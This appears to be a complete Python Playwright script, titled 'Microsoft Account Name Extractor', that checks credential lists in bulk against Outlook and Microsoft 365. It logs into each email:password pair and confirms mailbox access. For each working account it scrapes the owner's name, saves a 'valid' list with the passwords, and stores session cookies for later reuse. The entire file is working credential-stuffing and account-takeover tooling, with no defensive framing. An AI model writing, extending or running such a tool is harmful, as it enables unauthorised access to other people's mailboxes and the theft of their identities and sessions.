import time
import os
from pathlib import Path
from datetime import datetime
from playwright.sync_api import sync_playwright

# Configuration
INPUT_FILE = "input.txt"
OUTPUT_FILE = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
NO_MAILBOX_FILE = "no_mailbox.txt"
COOKIES_FOLDER = "cookies_sessions"
SAVE_COOKIES = True
HEADLESS = False
TIMEOUT = 30000

def load_credentials():
    """Load credentials from input file"""
    credentials = []
    
    try:
        with open(INPUT_FILE, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # Handle different separators
                if ';' in line:
                    parts = line.split(';')
                elif ':' in line:
                    parts = line.split(':')
                else:
                    print(f"[!] Line {line_num}: Invalid format - {line}")
                    continue
                
                if len(parts) >= 2:
                    email = parts[0].strip()
                    password = parts[1].strip()
                    credentials.append((email, password))
                else:
                    print(f"[!] Line {line_num}: Insufficient data - {line}")
                    
    except FileNotFoundError:
        print(f"[!] Input file {INPUT_FILE} not found")
        return []
    except Exception as e:
        print(f"[!] Error loading credentials: {e}")
        return []
    
    print(f"[+] Loaded {len(credentials)} credential pairs")
    return credentials

def write_result(email, password, name):
    """Write result to output file"""
    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}:{name}\n")
        print(f"[✓] Saved: {email}:{password}:{name}")
    except Exception as e:
        print(f"[!] Failed to write result: {e}")

def write_no_mailbox(email, password, reason):
    """Write no mailbox result to separate file"""
    try:
        with open(NO_MAILBOX_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}:{reason}\n")
        print(f"[X] No mailbox saved: {email}:{password}:{reason}")
    except Exception as e:
        print(f"[!] Failed to write no mailbox result: {e}")

def save_session_cookies(context, email):
    """Save session cookies for email script reuse"""
    if not SAVE_COOKIES:
        return
        
    try:
        cookies_dir = Path(COOKIES_FOLDER)
        cookies_dir.mkdir(exist_ok=True)
        
        session_file = f'session_{email.replace("@", "_at_")}.json'
        session_path = cookies_dir / session_file
        context.storage_state(path=str(session_path))
        
        print(f"[✓] Saved session: {session_file}")
        
    except Exception as e:
        print(f"[!] Failed to save session for {email}: {e}")

def load_session_cookies(email):
    """Load existing session cookies if available"""
    if not SAVE_COOKIES:
        return None
        
    try:
        cookies_dir = Path(COOKIES_FOLDER)
        session_file = f'session_{email.replace("@", "_at_")}.json'
        session_path = cookies_dir / session_file
        
        if session_path.exists():
            print(f"[>] Found existing session for {email}")
            return str(session_path)
            
    except Exception as e:
        print(f"[!] Failed to load session for {email}: {e}")
    
    return None

def handle_account_selection(page):
    """Handle account selection screen - always choose work/school account"""
    try:
        print("[>] Checking for account selection screen...")
        page.wait_for_timeout(3000)
        
        # Multiple possible selectors for account selection
        account_selection_indicators = [
            "text='It looks like this email is used with more than one account'",
            "text='Which one do you want to use?'",
            "text='Pick an account'",
            "text='Choose an account'",
            "text='Select an account'",
            "div[data-test-id='account-picker']",
            "[class*='accountPicker']",
            "[id*='accountPicker']"
        ]
        
        # Check if account selection screen is present
        selection_screen_found = False
        for indicator in account_selection_indicators:
            try:
                if page.locator(indicator).is_visible(timeout=3000):
                    selection_screen_found = True
                    print(f"[>] Account selection screen detected: {indicator}")
                    break
            except:
                continue
        
        if not selection_screen_found:
            print("[>] No account selection screen detected")
            return True
        
        print("[✓] Account selection screen confirmed - looking for work/school account...")
        
        # IMPROVED: More specific selectors for the work/school account based on the screenshot
        work_school_selectors = [
            # Direct text matches for the work/school option
            "text='Work or school account'",
            "div:has-text('Work or school account')",
            
            # Look for the container that has both the title and description
            "div:has-text('Work or school account'):has-text('Created by your IT department')",
            
            # Look for clickable containers with work/school text
            "[role='button']:has-text('Work or school account')",
            "[tabindex]:has-text('Work or school account')",
            
            # Alternative wordings
            "text='Work account'",
            "text='School account'", 
            "text='Work or School'",
            
            # Look for elements containing both work/school text and IT department text
            "div:has-text('IT department')",
            "*:has-text('Work or school account')",
            "*:has-text('Created by your IT department')"
        ]
        
        # Try to click work/school account
        for selector in work_school_selectors:
            try:
                work_elements = page.locator(selector)
                count = work_elements.count()
                print(f"[>] Trying selector '{selector}' - found {count} elements")
                
                for i in range(count):
                    element = work_elements.nth(i)
                    if element.is_visible(timeout=2000):
                        print(f"[✓] Found visible work/school account element: {selector}")
                        element.click()
                        print("[✓] Clicked work/school account")
                        page.wait_for_timeout(3000)
                        return True
                        
            except Exception as e:
                print(f"[!] Failed to click selector '{selector}': {e}")
                continue
        
        # Enhanced fallback: Look for any clickable area that contains work/school related text
        print("[>] Enhanced fallback - looking for work/school related clickable areas...")
        
        # Get all potential clickable elements
        all_elements = page.locator("div, button, a, [role='button'], [tabindex]").all()
        
        work_keywords = ['work or school', 'work account', 'school account', 'it department', 'organization', 'work', 'school']
        
        for element in all_elements:
            try:
                if element.is_visible(timeout=1000):
                    text_content = element.text_content().lower()
                    
                    # Check if element contains work/school keywords
                    for keyword in work_keywords:
                        if keyword in text_content:
                            print(f"[>] Found element with work/school text: '{text_content[:100]}'")
                            
                            # Try to click the element or its parent container
                            try:
                                element.click()
                                print(f"[✓] Successfully clicked element with keyword '{keyword}'")
                                page.wait_for_timeout(3000)
                                return True
                            except:
                                # Try clicking parent element if direct click fails
                                try:
                                    parent = element.locator('..')
                                    if parent.is_visible():
                                        parent.click()
                                        print(f"[✓] Successfully clicked parent element with keyword '{keyword}'")
                                        page.wait_for_timeout(3000)
                                        return True
                                except:
                                    continue
            except:
                continue
        
        # Last resort: Try to click on coordinates where work/school account typically appears
        print("[>] Last resort - trying coordinate-based click...")
        try:
            # Based on typical Microsoft login layouts, work/school account is usually in the upper area
            page.mouse.click(500, 430)  # Approximate position for work/school account
            print("[>] Clicked approximate work/school account position")
            page.wait_for_timeout(3000)
            return True
        except:
            pass
        
        # If absolutely nothing works, try the first clickable account option
        print("[!] Could not find work/school account specifically, trying any account option...")
        
        generic_selectors = [
            "div[role='button']",
            "[tabindex='0']", 
            "button",
            ".tile",
            "[class*='account']"
        ]
        
        for selector in generic_selectors:
            try:
                elements = page.locator(selector)
                count = elements.count()
                
                for i in range(count):
                    element = elements.nth(i)
                    if element.is_visible():
                        # Check if this element seems to be an account option
                        text = element.text_content().lower()
                        if 'account' in text or 'created' in text or '@' in text:
                            print(f"[>] Trying account option: {text[:50]}")
                            element.click()
                            page.wait_for_timeout(3000)
                            return True
            except:
                continue
        
        print("[!] Failed to handle account selection screen - no clickable options found")
        return False
        
    except Exception as e:
        print(f"[!] Error handling account selection: {e}")
        return False

def handle_feedback_popup(page):
    """Handle Microsoft feedback popup by clicking Cancel"""
    try:
        # Wait a bit for popup to appear
        page.wait_for_timeout(2000)
        
        # Look for feedback popup indicators
        feedback_selectors = [
            "text='Give feedback to Microsoft'",
            "button:has-text('Cancel')",
            "[aria-label='Cancel']",
            "button[type='button']:has-text('Cancel')"
        ]
        
        for selector in feedback_selectors:
            try:
                if page.locator(selector).is_visible(timeout=3000):
                    print("[>] Feedback popup detected")
                    # Click Cancel button
                    cancel_button = page.locator("button:has-text('Cancel')")
                    if cancel_button.is_visible():
                        cancel_button.click()
                        print("[✓] Clicked Cancel on feedback popup")
                        page.wait_for_timeout(1000)
                        return True
                    break
            except:
                continue
                
        return False
        
    except Exception as e:
        print(f"[!] Error handling feedback popup: {e}")
        return False

def extract_name_from_account_page(page):
    """Extract name from Microsoft account page"""
    try:
        print("[>] Looking for account name...")
        
        # Wait for page to load
        page.wait_for_timeout(3000)
        
        # Multiple selectors to find the name
        name_selectors = [
            "div.ms-tileTitle",
            "div[class*='ms-tileTitle']",
            "div[class*='tileTitle']",
            ".ms-pii",
            "h1[data-testid='profile-name']",
            "[data-testid='profile-name']",
            "div[class*='profile-name']",
            "h1[class*='displayName']",
            "div[class*='displayName']",
            ".displayName",
            "h2[class*='name']",
            "div[class*='userName']",
            "span[class*='displayName']"
        ]
        
        for selector in name_selectors:
            try:
                elements = page.locator(selector)
                count = elements.count()
                
                for i in range(count):
                    element = elements.nth(i)
                    if element.is_visible():
                        text = element.text_content().strip()
                        
                        # Validate that it looks like a name
                        if text and len(text) > 2 and not any(skip in text.lower() for skip in [
                            'microsoft', 'account', 'profile', 'settings', 'security', 
                            'privacy', 'devices', 'subscriptions', '@', 'sign out'
                        ]):
                            print(f"[✓] Found name with selector {selector}: {text}")
                            return text
                            
            except Exception as e:
                print(f"[!] Selector {selector} failed: {e}")
                continue
        
        # Fallback: try to find any text that looks like a name
        print("[>] Trying fallback name detection...")
        
        # Look for common name patterns
        all_text_elements = page.locator("div, span, h1, h2, h3").all()
        
        for element in all_text_elements:
            try:
                if element.is_visible():
                    text = element.text_content().strip()
                    
                    # Check if it looks like a name (2-4 words, each capitalized, no special chars)
                    if text and ' ' in text and len(text.split()) <= 4:
                        words = text.split()
                        if all(word[0].isupper() and word.isalpha() for word in words if len(word) > 1):
                            # Additional validation - not common UI text
                            ui_texts = ['Sign Out', 'Account Settings', 'Privacy Settings', 'Security Info']
                            if text not in ui_texts and len(text) < 50:
                                print(f"[✓] Found name via fallback: {text}")
                                return text
                                
            except:
                continue
        
        print("[!] Could not find account name")
        return "Name Not Found"
        
    except Exception as e:
        print(f"[!] Error extracting name: {e}")
        return "Extract Error"

def check_mailbox_exists(page):
    """Check if the mailbox/account is valid and accessible"""
    try:
        print("[>] Checking if mailbox exists...")
        page.wait_for_timeout(3000)
        
        # Check for common error indicators that suggest no mailbox
        error_indicators = [
            "Something went wrong",
            "This email doesn't exist",
            "Account not found",
            "UserNameNotValidboxAndNoLicenseAssignedError",
            "UnhandledRejection",
            "doesn't exist",
            "not found",
            "invalid account",
            "disabled",
            "suspended",
            "No mailbox",
            "mailbox not found",
            "not licensed",
            "license required"
        ]
        
        # Check page content for error messages
        page_content = page.content().lower()
        for error in error_indicators:
            if error.lower() in page_content:
                print(f"[!] Mailbox error detected: {error}")
                return False, f"Mailbox Error: {error}"
        
        # Check for specific error elements
        error_selectors = [
            "text='Something went wrong'",
            "text*='doesn\\'t exist'",
            "text*='not found'",
            "text*='invalid'",
            "text*='disabled'",
            "text*='suspended'",
            "[class*='error']",
            "[id*='error']",
            ".ms-error",
            "[data-testid*='error']"
        ]
        
        for selector in error_selectors:
            try:
                if page.locator(selector).is_visible():
                    error_text = page.locator(selector).text_content()
                    print(f"[!] Error element found: {error_text[:100]}")
                    return False, f"UI Error: {error_text[:50]}"
            except:
                continue
        
        # Check current URL for error indicators
        current_url = page.url.lower()
        if any(error in current_url for error in ['error', 'invalid', 'notfound']):
            print(f"[!] Error in URL: {current_url}")
            return False, "Error URL detected"
        
        # Try to access Outlook mail to verify mailbox exists
        print("[>] Attempting to access Outlook mail...")
        try:
            page.goto("https://outlook.office.com/mail", timeout=15000)
            page.wait_for_timeout(5000)
            
            # Check if we can access the mail interface
            current_url = page.url
            page_content = page.content().lower()
            
            # Signs that mailbox exists and is accessible
            mailbox_indicators = [
                "outlook.office.com/mail",
                "inbox",
                "compose",
                "new message",
                "mail",
                "folder",
                "message list"
            ]
            
            mailbox_found = False
            for indicator in mailbox_indicators:
                if indicator in current_url.lower() or indicator in page_content:
                    mailbox_found = True
                    break
            
            if mailbox_found:
                print("[✓] Mailbox verified - accessible")
                return True, "Mailbox accessible"
            
            # Check for specific mailbox error pages
            mailbox_errors = [
                "you don't have a mailbox",
                "no mailbox found",
                "mailbox not configured",
                "license required",
                "not licensed for email",
                "something went wrong"
            ]
            
            for error in mailbox_errors:
                if error in page_content:
                    print(f"[!] Mailbox not available: {error}")
                    return False, f"No Mailbox: {error}"
            
            # If we're redirected to account page instead of mail, mailbox might not exist
            if "myaccount.microsoft.com" in current_url and "mail" not in current_url:
                print("[!] Redirected to account page - likely no mailbox")
                return False, "No mailbox - redirected to account"
            
            print("[?] Mailbox status unclear, proceeding cautiously")
            return True, "Status unclear - proceeding"
            
        except Exception as mail_error:
            print(f"[!] Could not verify mailbox: {mail_error}")
            return False, f"Mailbox check failed: {str(mail_error)[:50]}"
        
    except Exception as e:
        print(f"[!] Mailbox validation error: {e}")
        return False, f"Validation error: {str(e)[:50]}"

def login_and_extract_name(email, password, p):
    """Login to Outlook first, check mailbox, then extract name if valid"""
    
    # Check for existing session first
    existing_session = load_session_cookies(email)
    
    if existing_session:
        print(f"[>] Trying existing session for {email}")
        browser = p.chromium.launch(headless=HEADLESS)
        context = browser.new_context(storage_state=existing_session)
        page = context.new_page()
        
        try:
            page.goto("https://outlook.office.com/mail", timeout=TIMEOUT)
            page.wait_for_timeout(3000)
            
            # Check if session is still valid and has mailbox access
            if "outlook.office.com/mail" in page.url and not page.locator("input[type='email']").is_visible():
                print("[✓] Existing session still valid with mailbox access!")
                
                # Go to account page to get name
                page.goto("https://myaccount.microsoft.com/", timeout=TIMEOUT)
                page.wait_for_timeout(2000)
                handle_feedback_popup(page)
                name = extract_name_from_account_page(page)
                browser.close()
                return name
            else:
                print("[!] Session expired or no mailbox access, proceeding with fresh login...")
                browser.close()
        except:
            print("[!] Session failed, proceeding with fresh login...")
            browser.close()
    
    # Fresh login process - START WITH OUTLOOK
    browser = p.chromium.launch(headless=HEADLESS)
    context = browser.new_context()
    page = context.new_page()
    
    try:
        print(f"[>] Processing: {email}")
        
        # Navigate directly to Outlook first
        print("[>] Navigating to Outlook...")
        page.goto("https://outlook.office.com/mail", timeout=TIMEOUT)
        page.wait_for_timeout(3000)
        
        # Login process
        print("[>] Starting login process...")
        
        # Enter email
        email_input = page.locator("input[type='email']")
        if email_input.is_visible():
            email_input.fill(email)
            page.click("input[type='submit'], button[type='submit']")
            page.wait_for_timeout(3000)
        
        # Handle account selection using the WORKING logic from your other script
        try:
            if page.locator("text=It looks like this email is used with more than one account").is_visible():
                print("[>] Selecting Work or school account...")
                work_account = page.locator("text=Work or school account")
                if work_account.is_visible():
                    work_account.click()
                    page.wait_for_timeout(3000)
        except:
            pass
        
        # Enter password
        password_input = page.locator("input[type='password']")
        if password_input.is_visible(timeout=10000):
            password_input.fill(password)
            page.click("input[type='submit'], button[type='submit']")
            page.wait_for_timeout(3000)
        else:
            print("[!] Password field not found")
            browser.close()
            return "Login Failed"
        
        # Handle "Stay signed in?" prompt
        try:
            if page.locator("text='Stay signed in?'").is_visible():
                print("[>] Handling 'Stay signed in' prompt...")
                yes_button = page.locator("input[id='idSIButton9'], button:has-text('Yes')")
                if yes_button.is_visible():
                    yes_button.click()
                    page.wait_for_timeout(2000)
                else:
                    no_button = page.locator("input[id='idBtn_Back'], button:has-text('No')")
                    if no_button.is_visible():
                        no_button.click()
                        page.wait_for_timeout(2000)
        except:
            pass
        
        # Wait for page to load after login
        print("[>] Waiting for Outlook to load...")
        page.wait_for_timeout(5000)
        
        # Check if we successfully reached Outlook with mailbox access
        current_url = page.url
        page_content = page.content().lower()
        
        print(f"[>] Current URL after login: {current_url}")
        
        # Check for mailbox access indicators
        mailbox_indicators = [
            "outlook.office.com/mail",
            "inbox",
            "compose",
            "new message"
        ]
        
        # First check for specific errors in page content
        error_indicators = [
            "something went wrong",
            "userhasnomailvoxandnolicenseassignederror",
            "userhasnomailvoxandnolicenseassigned",
            "usernamenotvalidboxandnolicenseassignederror", 
            "usernamenotvalidboxandnolicenseassigned",
            "no mailbox",
            "mailbox not found",
            "license required",
            "not licensed",
            "please try the recommended action",
            "refresh the application"
        ]
        
        error_found = None
        for error in error_indicators:
            if error in page_content:
                error_found = error
                break
        
        if error_found:
            print(f"[X] Mailbox error detected in content: {error_found}")
            browser.close()
            return f"No Mailbox: {error_found}"
        
        # Check for error elements in the page
        error_selectors = [
            "text='Something went wrong'",
            "text*='UserHasNoMailbox'",
            "text*='NoLicenseAssigned'", 
            "text*='try the recommended action'",
            "text*='Refresh the application'",
            "[class*='error']",
            "[id*='error']"
        ]
        
        for selector in error_selectors:
            try:
                if page.locator(selector).is_visible():
                    error_text = page.locator(selector).text_content()
                    print(f"[X] Error element found: {error_text[:100]}")
                    browser.close()
                    return f"No Mailbox: UI Error - {error_text[:50]}"
            except:
                continue
        
        # Check URL for error indicators  
        if any(error in current_url.lower() for error in ['error', 'invalid', 'notfound']):
            print(f"[X] Error detected in URL: {current_url}")
            browser.close()
            return f"No Mailbox: Error URL"
        
        # Now check for positive mailbox indicators
        mailbox_found = False
        for indicator in mailbox_indicators:
            if indicator in current_url.lower() or indicator in page_content:
                mailbox_found = True
                print(f"[✓] Mailbox indicator found: {indicator}")
                break
        
        if not mailbox_found:
            print("[X] No mailbox indicators found")
            browser.close()
            return "No Mailbox: No indicators found"
        
        # If we get here, mailbox exists and is accessible
        print("[✓] Mailbox verified and accessible!")
        
        # Now go to account page to extract name
        print("[>] Going to account page to extract name...")
        page.goto("https://myaccount.microsoft.com/", timeout=TIMEOUT)
        page.wait_for_timeout(3000)
        
        # Handle feedback popup
        handle_feedback_popup(page)
        
        # Extract name
        name = extract_name_from_account_page(page)
        
        if name and name not in ["Name Not Found", "Extract Error"]:
            # Save session cookies for future use
            save_session_cookies(context, email)
            print(f"[✓] Successfully extracted name: {name}")
            browser.close()
            return name
        else:
            print(f"[!] Failed to extract name: {name}")
            browser.close()
            return "Extract Error"
            
    except Exception as e:
        print(f"[!] Error during login/extraction process: {e}")
        browser.close()
        return "Process Error"

def main():
    """Main execution function"""
    print("="*60)
    print("🔍 MICROSOFT ACCOUNT NAME EXTRACTOR")
    print("="*60)
    print(f"📄 Output file: {OUTPUT_FILE}")
    print(f"🍪 Session saving: {'Enabled' if SAVE_COOKIES else 'Disabled'}")
    
    credentials = load_credentials()
    if not credentials:
        print("[!] No credentials to process. Exiting.")
        return
    
    if SAVE_COOKIES:
        Path(COOKIES_FOLDER).mkdir(exist_ok=True)
    
    success_count = 0
    fail_count = 0
    
    with sync_playwright() as p:
        for i, (email, password) in enumerate(credentials, 1):
            print(f"\n[>] Processing {i}/{len(credentials)}: {email}")
            
            try:
                name = login_and_extract_name(email, password, p)
                
                if name and name not in ["Login Failed", "Process Error", "Extract Error", "Name Not Found", "Account Selection Failed"] and not name.startswith("No Mailbox:"):
                    write_result(email, password, name)
                    success_count += 1
                    print(f"[✓] Success: {email} -> {name}")
                elif name.startswith("No Mailbox:"):
                    reason = name.replace("No Mailbox: ", "")
                    write_no_mailbox(email, password, reason)
                    fail_count += 1
                    print(f"[X] No Mailbox: {email} -> {reason}")
                else:
                    fail_count += 1
                    print(f"[X] Failed: {email} -> {name}")
                
                # Small delay between accounts
                if i < len(credentials):
                    print("[>] Waiting before next account...")
                    time.sleep(2)
                    
            except Exception as e:
                print(f"[X] Critical error for {email}: {e}")
                fail_count += 1
    
    print("\n" + "="*60)
    print("📋 EXTRACTION SUMMARY")
    print("="*60)
    print(f"📧 Total Accounts: {len(credentials)}")
    print(f"✅ Successfully Extracted: {success_count}")
    print(f"❌ Failed: {fail_count}")
    print(f"📈 Success Rate: {(success_count/len(credentials)*100):.1f}%")
    print(f"📄 Valid results: {OUTPUT_FILE}")
    print(f"📄 No mailbox results: no_mailbox.txt")
    if SAVE_COOKIES:
        print(f"🍪 Sessions saved to: {COOKIES_FOLDER}/")
    print("="*60)

if __name__ == "__main__":
    main()
